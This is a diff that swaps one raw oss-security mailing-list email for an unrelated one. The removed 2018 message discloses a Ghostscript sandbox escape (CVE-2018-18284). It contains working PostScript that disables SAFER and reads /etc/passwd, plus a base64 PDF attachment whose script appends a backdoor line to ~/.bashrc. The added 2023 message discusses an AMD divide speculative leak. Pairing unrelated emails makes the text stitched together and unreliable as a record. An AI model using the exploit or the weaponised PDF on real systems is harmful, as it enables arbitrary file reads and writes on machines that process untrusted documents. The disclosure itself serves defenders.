@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["10019" "Wednesday" "17" "October" "2018" "13:48:53" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+Db=VQi14vEfA8AeRbqEfROwApCbgVqPQny7qbhj7nhw@mail.gmail.com>" "188" "[oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284" "^Date:" nil nil "10" "2018101720:48:53" "[oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284" (number mark "        taviso@googl Oct 17  188/10019 " thread-indent "\"[oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284\"\n") "<CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>" ("<CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 26373 invoked by uid 550); 17 Oct 2018 20:49:21 -0000
+Received: (qmail 15589 invoked by uid 550); 4 Oct 2023 01:11:12 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,229 +6,154 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 26355 invoked from network); 17 Oct 2018 20:49:20 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
-        bh=ajelgMLiIDSnRi7ngPkuVY6IghQawsffW6QKEFIzXYo=;
-        b=BI94Dc1flSjZbzihdtJUsnWB9PwnztVOt6kQU+AaH3nOULPYcbwPRnz7DYyhK7uR3B
-         nT1b/hs1OFfh7lLz/9jlkwht5GPLve1OlX0WbNFzOnxO4E73gjscP5rZw3QxQ8NwLXZH
-         0u5erUBjNNEPrZhe9ta8aE3lQObr4ZMSg0ac5lobUpnX55dqmEwPHNXHX1t/eLrT2Fdn
-         xcoAGMZRsdeP+JXu2u8J1n8usG7t+KgAZQDwDVp04yHlkjwcODIZ4ErocrITXGT0zOA/
-         07X0G+HQX8hrHeYfQTGnCp1Pr0YkczhJv3QWzKs8MCPpMae4K1wIbF5/r362/Fkdr8jH
-         LGMA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to;
-        bh=ajelgMLiIDSnRi7ngPkuVY6IghQawsffW6QKEFIzXYo=;
-        b=a5L+qEqWu9z4vAZo7cR0pB9wWi6QtGwBUN+SP8hOBakg7ydgInj7qPWQKqhYEY/33C
-         Y/lm9tikeLHyZQPuH7Kq7EcgK6+WpBMEFGGt46BGkZgqDq2nfrSO7rAMuNGpiNAq5vOG
-         o0NuBQrpMj3jZg3IjhcOhRYstw0xPk+uxSm1CO6/DqrYm8KmKvpyEJ2R/HDD1hXBrx+2
-         TXTSa36AthoKb8oF1ape1t7ds04O1p4yuY38w/ZmI2QN7E/EsPahQ2kjYjSdl7BhXcmI
-         psD6sQyeicfXpJpNaHKdsx2XCYXlArAEVjCRTZxrs50ZN2MZRAqEp1rWNBfzuM+NhRNM
-         FZ/A==
-X-Gm-Message-State: ABuFfohfAFdx3soW6ByomWx02JLE9ZGLisMZymJXwq18hu90NKf3MIEG
-	568jpiKjdCrVduwlf1Qtm1t8wxgZkSgmO14vdGL9TVnJ2XVXXQ==
-X-Google-Smtp-Source: ACcGV639SUvMuBNHTNq6464NHNdgdtwD/0YXYbuGf1Rf4k7646CPHVGDFsjCTbxKpmffqi4WV/Syj4R4i23nZ1zMSEA=
-X-Received: by 2002:a0c:b512:: with SMTP id d18mr3126051qve.154.1539809346451;
- Wed, 17 Oct 2018 13:49:06 -0700 (PDT)
-MIME-Version: 1.0
-References: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
-In-Reply-To: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
-Message-ID: <CAJ_zFk+Db=VQi14vEfA8AeRbqEfROwApCbgVqPQny7qbhj7nhw@mail.gmail.com>
-Content-Type: multipart/mixed; boundary="0000000000001e95e1057872cdc0"
-Date: Wed, 17 Oct 2018 13:48:53 -0700
-From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
-To: oss-security@lists.openwall.com
+Received: (qmail 15570 invoked from network); 4 Oct 2023 01:11:12 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=citrix.com; s=google; t=1696381860; x=1696986660; darn=lists.openwall.com;
+        h=in-reply-to:autocrypt:references:cc:to:content-language:subject
+         :from:user-agent:mime-version:date:message-id:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=mxlnDTiqEVwy7gahVSvMHyERgGTKefvbhpk30l/pX54=;
+        b=IYJ+jb8iiD6Ti+fVe7a/5K6Br5GBpk46WLDMOwmGjtQUxNI1weXQVtBz1SU3mPcZnn
+         J4earD3CecTbjX+qv4hNcWSJF3fNphEUSuZSrEOiDPlfCLVYIZ8JIqu9cdKLELcvhKrs
+         vTIcr7p9lCeZsuzwS7jcbGNt1bgJPcrwEhDPQ=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1696381860; x=1696986660;
+        h=in-reply-to:autocrypt:references:cc:to:content-language:subject
+         :from:user-agent:mime-version:date:message-id:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=mxlnDTiqEVwy7gahVSvMHyERgGTKefvbhpk30l/pX54=;
+        b=TlaV4qcMpmqzPes5Gs50PVlkYXLiPM2/KWYOaHzga411YpPwRu3IGf+JYup9lE6qJV
+         F1ve5WkzZftMDgsO9rHLB4MW6+9jIpjKW+WyDX2tX4RfIj3UnHNBD9afsKaAhjqijp00
+         Nk05gvYIsfqO0ZZKptcGmWNuIiUx8VpUp4olnz/bSGbSAL/zEdp2R95BXw4sZ6N/+o65
+         hoAwcO3QLBdxTBAhsvxiFY/m6yoXjiLvQlSkHn0VeNiRAxfH9g4HrGWQOybOyIW0uT28
+         ZV8rmWJ+f7+ZMS6+/3NTefKGhnTnv05JH+AcsIdeAl4cjcKsk5muJUyj+SLJoNwLkfWr
+         ka7A==
+X-Gm-Message-State: AOJu0YzOWML28d3m+TcBeEn0onYVqueeXLEIq0ZyhhzKKi31xzDGRiM1
+	xLToIV6rOAvlOmh6AnSGOwVTSg==
+X-Google-Smtp-Source: AGHT+IFC9CRKLlDgTSuE1zSIJcm3olqxEH/0wEkiB6UNQDKNCo3z77QtKhU/tU4VfpnC5u1vUWbGLw==
+X-Received: by 2002:adf:fec4:0:b0:31f:f9fb:d5bd with SMTP id q4-20020adffec4000000b0031ff9fbd5bdmr815075wrs.68.1696381860456;
+        Tue, 03 Oct 2023 18:11:00 -0700 (PDT)
+Content-Type: multipart/alternative;
+ boundary="------------d1K35FGwLhN0PWhbI8H6tXug"
+Message-ID: <4b386d20-6b24-427b-ac3f-2098cf402329@citrix.com>
+Date: Wed, 4 Oct 2023 02:10:59 +0100
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+From: Andrew Cooper <andrew.cooper3@citrix.com>
+Content-Language: en-GB
+To: Solar Designer <solar@openwall.com>
+Cc: oss-security@lists.openwall.com,
+ "Xen. org security team" <security-team-members@xen.org>
+References: <E1qko5Z-0003cF-KD@xenbits.xenproject.org>
+ <20230925163652.GA6750@openwall.com>
+ <70e568d7-9e09-a1a9-030f-40473447a619@citrix.com>
+ <20230925182834.GA8247@openwall.com>
+ <3241bf87-b01b-4b65-e972-f0cede9e1855@citrix.com>
+ <20230926160943.GA12790@openwall.com>
+ <3df9034c-6fab-141c-ad69-ce00df0b81f9@citrix.com>
+ <20231003205825.GA24992@openwall.com>
+Autocrypt: addr=andrew.cooper3@citrix.com; keydata=
+ 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
+ 6+ahAA==
+In-Reply-To: <20231003205825.GA24992@openwall.com>
+Subject: Re: [oss-security] Xen Security Advisory 439 v1 (CVE-2023-20588) -
+ x86/AMD: Divide speculative information leak
 
---0000000000001e95e1057872cdc0
-Content-Type: multipart/alternative; boundary="0000000000001e95dd057872cdbe"
+--------------d1K35FGwLhN0PWhbI8H6tXug
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
 
---0000000000001e95dd057872cdbe
-Content-Type: text/plain; charset="UTF-8"
+On 03/10/2023 9:58 pm, Solar Designer wrote:
+> However, this may be another reason to actually look into whether the
+> remainder also leaked, and whether the byte-sized form prevents that
+> leak despite of it not touching the architectural register where the
+> remainder would be stored by a preceding larger DIV.  I expect that
+> we're fine here - it's the divider unit's internal register and not the
+> architectural register that should matter - but worth making sure.  It
+> could also theoretically be e.g. some buffer registers in the middle,
+> where the byte-sized form wouldn't overwrite the full contents.
 
-Apparently it wasn't clear that this allowed reading and writing of
-arbitrary files, here is a full exploit (I just modified the CVE-2018-17961
-exploit).
+I've spent a while trying to reason about this...  I'm not sure I'm any
+the wiser, but here goes.
 
-$ convert executeonly-bypass.pdf exploit.jpg
-$ tail -1 ~/.bashrc
-echo pwned by postscript
+In order for values to be forwarded to dependent operations, the
+register file entries allocated to the answer(s) of the DIV must have
+been marked as ready.  (i.e. it's not sufficient for it to "just" be
+left on the output of the divider because there won't be a special path
+sideways to other execute units.)
 
+Furthermore in this case, a real answer from the divider must have
+written back, as we're concerned here about the last DIV to have
+completed, and not some other stale content which happened to live in
+the register file.  (The Gather Data Sampling vulnerability from the
+same deadline is an example of a vector register being marked as good
+before it has been completely overwritten, hence the leaking of stale
+content.)
 
-Thanks, Tavis.
+There are two sources of #DE.  A divide by 0, or result out of range.
 
+A sane implementation of a hardware divider isn't going to multiply the
+numerator and denominator to evaluate result out of range, when it can
+just look for a carry/overflow on the final iteration.  On the other
+hand, checking for 0 has to be done first because the result of the
+operation is nonsensical otherwise.  Indeed, this is exactly how the
+8086 did it[1].
 
-On Tue, Oct 16, 2018 at 11:06 AM Tavis Ormandy <taviso@google.com> wrote:
+So the practical results of the divider are either a failure at the
+start (which is div0) or a result at the end (which is either success,
+or out-of-range).
 
-> Hello, this
-> <https://bugs.chromium.org/p/project-zero/issues/detail?id=1696> is
-> CVE-2018-18284, another ghostscript sandbox escape. Because procedures in
-> postscript are just executable arrays, all system procedures need to be
-> marked as executeonly, so that users cannot peek at their internals with
-> array operators.
->
-> We have also recently learned that they must be marked as
-> pseudo-operators, otherwise their contents might leak to error handlers.
->
-> That makes sense, unless the procedure itself is dangerous - in that case
-> it must be hidden.
->
-> 1Policy is a procedure that was correctly marked as executeonly and made a
-> pseudo-operator, but was basically just a wrapper around .forceput. Here is
-> how to exploit it:
->
-> /.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
-> get exec pop pop pop pop pop pop pop } def
->
-> Once you have access to .forceput, you can basically do whatever you want,
-> see the exploit for CVE-2018-17961 a full example of backdooring .bashrc.
->
-> Here is a simpler repro, just reading /etc/passwd:
->
-> $ gs -dSAFER -sDEVICE=ppmraw
-> GPL Ghostscript 9.25 (2018-09-13)
-> Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
-> This software comes with NO WARRANTY: see the file PUBLIC for details.
-> GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
-> get exec pop pop pop pop pop pop pop } def
-> GS>systemdict /SAFER false .forceput
-> GS>systemdict /userparams get /PermitFileControl [(*)] .forceput
-> GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput
-> GS>systemdict /userparams get /PermitFileReading [(*)] .forceput
-> GS>(/etc/passwd) (r) file 1024 string readline pop ==
-> (root:x:0:0:root:/root:/bin/bash)
-> GS>
->
-> This patch solves it:
->
->
-> http://git.ghostscript.com/?p=ghostpdl.git;h=8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b
->
-> Side note: I'm done looking at ghostscript for now, but still *strongly*
-> recommend that we deprecate untrusted postscript and disable ghostscript
-> coders by default in policy.xml.
->
-> Thanks, Tavis.
->
+Viewed from this perspective, it's perhaps easy to see why the div0 case
+passes the prior result (i.e. nothing mutated the buffer), whereas all
+other cases have put a result (correct or otherwise) into buffer before
+signalling a completion of the instruction.
 
---0000000000001e95dd057872cdbe
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Either way, it's just speculation for now, and we all know how dangerous
+that can be...
 
-<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr">Apparently it wasn&#39;t=
- clear that this allowed reading and writing of arbitrary files, here is a =
-full exploit (I just modified the CVE-2018-17961 exploit).<div><br></div><d=
-iv><div><font face=3D"monospace, monospace">$ convert executeonly-bypass.pd=
-f exploit.jpg</font></div></div><div><div><font face=3D"monospace, monospac=
-e">$ tail -1 ~/.bashrc=C2=A0</font></div><div><font face=3D"monospace, mono=
-space">echo pwned by postscript</font></div></div><div><br></div><div><br><=
-/div><div>Thanks, Tavis.</div><div><br></div></div></div></div><br><div cla=
-ss=3D"gmail_quote"><div dir=3D"ltr">On Tue, Oct 16, 2018 at 11:06 AM Tavis =
-Ormandy &lt;<a href=3D"mailto:taviso@google.com">taviso@google.com</a>&gt; =
-wrote:<br></div><blockquote class=3D"gmail_quote" style=3D"margin:0 0 0 .8e=
-x;border-left:1px #ccc solid;padding-left:1ex"><div dir=3D"ltr"><div dir=3D=
-"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr">Hello, <a href=3D"=
-https://bugs.chromium.org/p/project-zero/issues/detail?id=3D1696" target=3D=
-"_blank">this</a> is CVE-2018-18284, another ghostscript sandbox escape. Be=
-cause procedures in postscript are just executable arrays, all system proce=
-dures need to be marked as executeonly, so that users cannot peek at their =
-internals with array operators.<div><br></div><div>We have also recently le=
-arned that they must be marked as pseudo-operators, otherwise their content=
-s might leak to error handlers.</div><div><br></div><div>That makes sense, =
-unless the procedure itself is dangerous - in that case it must be hidden.<=
-/div><div><br></div><div>1Policy is a procedure that was correctly marked a=
-s executeonly and made a pseudo-operator, but was basically just a wrapper =
-around .forceput. Here is how to exploit it:</div><div><br></div><div><div>=
-<div><font face=3D"monospace, monospace">/.forceput { &lt;&lt;&gt;&gt; &lt;=
-&lt;&gt;&gt; 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop =
-pop pop pop pop pop pop } def</font></div></div></div><div><br></div><div>O=
-nce you have access to .forceput, you can basically do whatever you want, s=
-ee the exploit for CVE-2018-17961 a full example of backdooring .bashrc.</d=
-iv><div><br></div><div>Here is a simpler repro, just reading /etc/passwd:</=
-div><div><br></div><div><div><font face=3D"monospace, monospace">$ gs -dSAF=
-ER -sDEVICE=3Dppmraw</font></div><div><font face=3D"monospace, monospace">G=
-PL Ghostscript 9.25 (2018-09-13)</font></div><div><font face=3D"monospace, =
-monospace">Copyright (C) 2018 Artifex Software, Inc.=C2=A0 All rights reser=
-ved.</font></div><div><font face=3D"monospace, monospace">This software com=
-es with NO WARRANTY: see the file PUBLIC for details.</font></div><div><fon=
-t face=3D"monospace, monospace">GS&gt;/.forceput { &lt;&lt;&gt;&gt; &lt;&lt=
-;&gt;&gt; 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop pop=
- pop pop pop pop pop } def</font></div><div><font face=3D"monospace, monosp=
-ace">GS&gt;systemdict /SAFER false .forceput</font></div><div><font face=3D=
-"monospace, monospace">GS&gt;systemdict /userparams get /PermitFileControl =
-[(*)] .forceput</font></div><div><font face=3D"monospace, monospace">GS&gt;=
-systemdict /userparams get /PermitFileWriting [(*)] .forceput</font></div><=
-div><font face=3D"monospace, monospace">GS&gt;systemdict /userparams get /P=
-ermitFileReading [(*)] .forceput</font></div><div><font face=3D"monospace, =
-monospace">GS&gt;(/etc/passwd) (r) file 1024 string readline pop =3D=3D</fo=
-nt></div><div><font face=3D"monospace, monospace">(root:x:0:0:root:/root:/b=
-in/bash)<br></font></div><div><font face=3D"monospace, monospace">GS&gt;</f=
-ont></div></div><div><br></div><div>This patch solves it:</div><div><br></d=
-iv><div><a href=3D"http://git.ghostscript.com/?p=3Dghostpdl.git;h=3D8d19fdf=
-63f91f50466b08f23e2d93d37a4c5ea0b" target=3D"_blank">http://git.ghostscript=
-.com/?p=3Dghostpdl.git;h=3D8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b</a></di=
-v><div><br></div><div>Side note: I&#39;m done looking at ghostscript for no=
-w, but still <b>strongly</b> recommend that we deprecate untrusted postscri=
-pt and disable ghostscript coders by default in policy.xml.=C2=A0</div><div=
-><br></div><div>Thanks, Tavis.</div></div></div></div></div></div>
-</blockquote></div>
+~Andrew
 
---0000000000001e95dd057872cdbe--
-
---0000000000001e95e1057872cdc0
-Content-Type: application/pdf; name="executeonly-bypass.pdf"
-Content-Disposition: attachment; filename="executeonly-bypass.pdf"
-Content-Transfer-Encoding: base64
-Content-ID: <f_jndmp8640>
-X-Attachment-Id: f_jndmp8640
-
-JSFQUwolCiUgVGhpcyBpcyBnaG9zdHNjcmlwdCBidWcgNjk5OTYzLCAxUG9s
-aWN5IGlzIGVxdWl2YWxlbnQgdG8gLmZvcmNlcHV0CiUKJSBQcm9qZWN0IFpl
-cm8gYnVnIDE2OTYuCiUKCiUgOy0pCih3aGF0IGRvIHdlIHdhbnQ/XG4pIHBy
-aW50CihcdGRlcHJlY2F0ZSB1bnRydXN0ZWQgcG9zdHNjcmlwdCFcbikgcHJp
-bnQKKHdoZW4gZG8gd2Ugd2FudCBpdD9cbikgcHJpbnQKKFx0bm93IVxuKSBw
-cmludAoKJSBub3cgd2UgaGF2ZSBhY2Nlc3MgdG8gZm9yY2VwdXQKL2ZvcmNl
-cHV0IHsgPDw+PiA8PD4+IDQgaW5kZXggKGlnbm9yZWQpIDUgaW5kZXggNSBp
-bmRleCAucG9saWN5cHJvY3MgMSBnZXQgZXhlYyBwb3AgcG9wIHBvcCBwb3Ag
-cG9wIHBvcCBwb3AgfSBkZWYKCiUgTm93IHdlIGNhbiBkbyB3aGF0ZXZlciB3
-ZSBsaWtlLCBsZXRzIGRpc2FibGUgU0FGRVIgYW5kIGdpdmUgb3Vyc2VsdmVz
-IGFjY2VzcwolIHRvIHRoZSB3aG9sZSBmaWxlc3lzdGVtIChpbmNsdWRpbmcg
-LmJhc2hyYywgc3NoIGtleXMsIGNocm9tZSBjb29raWVzLCBldmVyeXRoaW5n
-KQpzeXN0ZW1kaWN0IC9TQUZFUiBmYWxzZSBmb3JjZXB1dApzeXN0ZW1kaWN0
-IC91c2VycGFyYW1zIGdldCAvUGVybWl0RmlsZUNvbnRyb2wgWygqKV0gZm9y
-Y2VwdXQKc3lzdGVtZGljdCAvdXNlcnBhcmFtcyBnZXQgL1Blcm1pdEZpbGVX
-cml0aW5nIFsoKildIGZvcmNlcHV0CnN5c3RlbWRpY3QgL3VzZXJwYXJhbXMg
-Z2V0IC9QZXJtaXRGaWxlUmVhZGluZyBbKCopXSBmb3JjZXB1dAoKJSBEZW1v
-bnN0cmF0ZSByZWFkaW5nIGEgZmlsZSB3ZSBzaG91bGRudCBoYXZlIGFjY2Vz
-cyB0by4KKC9ldGMvcGFzc3dkKSAocikgZmlsZSBkdXAgNjQgc3RyaW5nIHJl
-YWRsaW5lIHBvcCA9PSBjbG9zZWZpbGUKCiUgVGhlIGdldGVudiBvcGVyYXRv
-ciBnZXRzIHJlbW92ZWQgYW5kIHdlIGNhbid0IGdldCBpdCBiYWNrLCBoZXJl
-IGlzIGEKJSByZXBsYWNlbWVudC4KJSAoSE9NRSkgbmV3Z2V0ZW52ICgvcGF0
-aC90by9ob21lKSB0cnVlICAgICAlIGZvdW5kCiUgKGZvb2JhcikgbmV3Z2V0
-ZW52IGZhbHNlICAgICAgICAgICAgICAgICAgJSBub3Rmb3VuZAovbmV3Z2V0
-ZW52IHsKICAgICUgcmVhZCBlbnRpcmUgZW52aXJvbm1lbnQgaW50byBzdHJp
-bmcKICAgICgvcHJvYy9zZWxmL2Vudmlyb24pIChyKSBmaWxlIGR1cCAzMjc2
-OCBzdHJpbmcgcmVhZHN0cmluZyBwb3AgZXhjaCBjbG9zZWZpbGUKCiAgICAl
-IHNlYXJjaCBmb3IgdmFyaWFibGUKICAgIGV4Y2ggZHVwIChcMCkgZXhjaCBj
-b25jYXRzdHJpbmdzICg9KSBjb25jYXRzdHJpbmdzIGV4Y2ggMyAxIHJvbGwg
-c2VhcmNoIG5vdCB7CiAgICAgICAgJSBub3QgZm91bmQsIGNvdWxkIGJlIGF0
-IHRoZSBzdGFydCwgc28gbm8gbGVhZGluZyBudWw/CiAgICAgICAgMSBpbmRl
-eCAoPSkgY29uY2F0c3RyaW5ncyBhbmNob3JzZWFyY2ggbm90IHsKICAgICAg
-ICAgICAgKG5vdGZvdW5kKQogICAgICAgIH0geyBwb3AgfSBpZmVsc2UKICAg
-IH0geyBwb3AgcG9wIH0gaWZlbHNlCgogICAgJSByZW1vdmUgZXZlcnl0aGlu
-ZyBhZnRlciBwYXRoLCB0aGVyZSBpcyBhbHdheXMgYSBudWwgb24gTGludXgu
-CiAgICAoXDApIHNlYXJjaCB7IDQgMSByb2xsIHBvcCBwb3AgcG9wIHRydWUg
-fSB7CiAgICAgICAgJSBtdXN0IGJlIHRoZSBub3Rmb3VuZCBzdHJpbmcKICAg
-ICAgICBwb3AgcG9wIHBvcCBmYWxzZQogICAgfSBpZmVsc2UKfSBkZWYKCiUg
-SGVyZSBpcyBob3cgdG8gZWRpdCAuYmFzaHJjLi4uCi9iYWNrZG9vcmJhc2gg
-ewogICAgJSBub3cgd2UgY2FuIGFwcGVuZCB0byBiYXNocmMKICAgIChIT01F
-KSBuZXdnZXRlbnYgcG9wICgvLmJhc2hyYykgY29uY2F0c3RyaW5ncyAoYSkg
-ZmlsZSBkdXAKCiAgICAlIGJhY2tkb29yCiAgICAoZWNobyBwd25lZCBieSBw
-b3N0c2NyaXB0XG4pIHdyaXRlc3RyaW5nCgogICAgJSBhbGwgZG9uZQogICAg
-Y2xvc2VmaWxlCn0gZGVmCgpiYWNrZG9vcmJhc2gKcXVpdAo=
-
---0000000000001e95e1057872cdc0--
+[1]
+https://www.righto.com/2023/04/reverse-engineering-8086-divide-microcode.html
+--------------d1K35FGwLhN0PWhbI8H6tXug--
